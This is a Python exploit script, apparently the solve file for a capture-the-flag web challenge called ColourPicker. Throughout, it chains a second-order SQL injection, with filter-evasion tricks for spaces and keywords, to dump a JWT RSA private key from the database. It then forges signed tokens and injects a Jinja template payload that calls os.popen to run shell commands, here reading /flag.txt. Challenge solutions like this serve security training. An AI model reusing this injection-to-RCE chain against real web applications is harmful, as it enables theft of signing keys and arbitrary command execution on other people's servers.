#!/usr/bin/env python3
# pylint: disable=W0221, R0913, R0914, R0917

"""
    Exploit for ColourPicker challenge
    Written by Zeecka
"""

import re
import sys
import time
from base64 import urlsafe_b64decode
from html import unescape

import jwt
import requests
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

__author__ = "Zeecka"


class BaseURLSession(requests.Session):
    """Requests session with savec BaseURL"""

    def __init__(self, base_url: str):
        super().__init__()
        self.base_url = base_url

    def request(self, method, url, **kwargs):
        full_url = f"{self.base_url}{url}"
        return super().request(method, full_url, **kwargs)


class Exploit:
    """Main exploit class, providing SSTI and SQLi features"""

    popen_index: str

    def __init__(self, url: str) -> None:
        self.r = BaseURLSession(url.removesuffix("/"))

    def _display_error(self, response: str) -> None:
        reg = '<div class="alert alert-danger" role="alert">(.*)</div>'
        search = re.search(reg, response, re.IGNORECASE)
        if search:
            print(search.group(1))
        # print(response)

    def register(self, username: str, password: str) -> bool:
        """Register with given username and password,
        and return register status.
        """
        r = self.r.post(
            "/login",
            data={
                "username": username,
                "password": password,
                "register": "on",
            },
        )
        self._display_error(r.text)
        return "Utilisateur créé" in r.text

    def login(self, username: str, password: str) -> bool:
        """Login with given username and password,
        and return login status.
        """
        r = self.r.post(
            "/login",
            data={"username": username, "password": password},
        )
        self._display_error(r.text)
        return "Bienvenue" in r.text

    def logout(self) -> None:
        """Logout current user."""
        self.r.get("/logout")

    def second_order(self, username: str) -> str:
        """Register and login with given payload,
        and extract user id (aka. 2nd order SQL result)
        """
        self.logout()
        _ = self.register(username, "password"), "Register failed"
        assert self.login(username, "password"), "Login failed"
        r = self.r.get("/")
        success = re.search("ID Utilisateur: (.*)</p>", r.text, re.IGNORECASE)
        assert success, "Cannot extract user id"
        return success.group(1)

    def sql_exec(self, query: str) -> str:
        """Execute SQL query and return output"""
        req = f"' UNION {query} /*"
        req = req.replace(" ", "/*_*/")

        badchars = [" ", '"', "<", ">", "script", "=", ";", "-", "--", "/**/"]
        for c in badchars:
            assert c not in req, f'Bad char "{c}" found in "{req}"'

        ret = self.second_order(req)
        print(ret)
        return ret

    def ssti_exec(self, token: str) -> str:
        """Execute python payload in SSTI"""
        self.r.cookies.clear()
        self.r.cookies.set("token", token)
        r = self.r.get("/")

        success = re.search('hex="(.*)" id="picker">', r.text, re.IGNORECASE)
        assert success, f"Cannot extract SSTI output: {r.text}"
        return success.group(1)

    def set_popen_index(self, index: int) -> None:
        """Set Popen Index from the MRO subclasses list"""
        self.popen_index = str(index)

    def ssti_exec_cmd(self, command: str, private_key: str) -> str:
        """Execute system command based on SSTI with Popen"""
        token = generate_jwt(
            r"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('"
            + command
            + "').read() }}",
            private_key,
        )
        resp = unescape(self.ssti_exec(token))
        return resp


def str_to_ints(word: str) -> str:
    """Convert a word into a list of integer"""
    return ",".join([str(ord(c)) for c in word])


def jwk_to_pem(
    p: str, q: str, d: str, e: str, n: str, qi: str, dp: str, dq: str
) -> str:
    """Convert a RSA key from JWK format to PEM"""

    def b64_to_int(value: str) -> int:
        """Convert Base64 encoded value to Int"""
        return int.from_bytes(urlsafe_b64decode(value + "=="), "big")

    # Construct the RSA private key
    private_key = rsa.RSAPrivateNumbers(
        p=b64_to_int(p),
        q=b64_to_int(q),
        d=b64_to_int(d),
        dmp1=b64_to_int(dp),
        dmq1=b64_to_int(dq),
        iqmp=b64_to_int(qi),
        public_numbers=rsa.RSAPublicNumbers(e=b64_to_int(e), n=b64_to_int(n)),
    ).private_key()

    # Serialize the private key to PEM format
    pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )

    return pem.decode("utf-8")


def generate_jwt(payload: str, private_key: str) -> str:
    """Generate a valid JWT based on a given payload an private key"""
    now = int(time.time())
    json = {
        "user_id": 1,
        "colour": payload,
        "iat": now,
        "exp": now + 60 * 60 * 2,
    }
    # Encode the JWT
    token = jwt.encode(
        json,
        private_key,
        algorithm="RS256",
        headers={"kid": "default"},
    )
    return token


def main(url: str) -> None:
    """Main exploitation scenario"""

    exp = Exploit(url)
    # Execute simple query
    print("[+] Select 5*5")
    exp.sql_exec("SELECT 5*5")

    # Dump SQL Version
    print("\n[+] SELECT sqlite_version()")
    exp.sql_exec("SELECT sqlite_version()")

    # Dump Tables
    print("\n[+] List tables")
    exp.sql_exec(
        "SELECT GROUP_CONCAT(tbl_name) FROM sqlite_master "
        f"WHERE type LIKE char({str_to_ints('table')})"
    )

    # Dump schema
    print("\n[+] Show table schema for jwt_keys")
    exp.sql_exec(
        f"SELECT REPLACE(GROUP_CONCAT(sql),char(10),char(20)) "
        "FROM sqlite_master "
        f"WHERE tbl_name LIKE char({str_to_ints('jwt_keys')})"
    )

    # Dump records count
    print("\n[+] Select records count")
    exp.sql_exec("SELECT COUNT(*) FROM jwt_keys")

    # Dump records
    print("\n[+] Select JWK key")
    data = exp.sql_exec(
        "SELECT p||char(9)||q||char(9)||d||char(9)||e||char(9)||n"
        "||char(9)||qi||char(9)||dp||char(9)||dq FROM jwt_keys LIMIT 1"
    )

    print("\n[+] Convert to PEM")
    # Extract RSA values (JWK format)
    p, q, d, e, n, qi, dp, dq = data.split("\t")
    # Your RSA private key in PEM format
    private_key = jwk_to_pem(p, q, d, e, n, qi, dp, dq)
    print(private_key)

    print("\n[+] SSTI with 7*7")
    token = generate_jwt(r"{{7*7}}", private_key)
    print(exp.ssti_exec(token))

    print("\n[+] Executing 'cat /flag.txt' command with os.popen().read()")
    command = "cat /flag.txt"
    print(exp.ssti_exec_cmd(command, private_key))


if __name__ == "__main__":
    # Check if an argument is provided
    if len(sys.argv) < 2:
        print("Error: No URL provided.")
        print("Usage: python solve.py <url>")
        sys.exit(1)

    # Get the URL from the argument
    remote_url = sys.argv[1]
    main(remote_url)
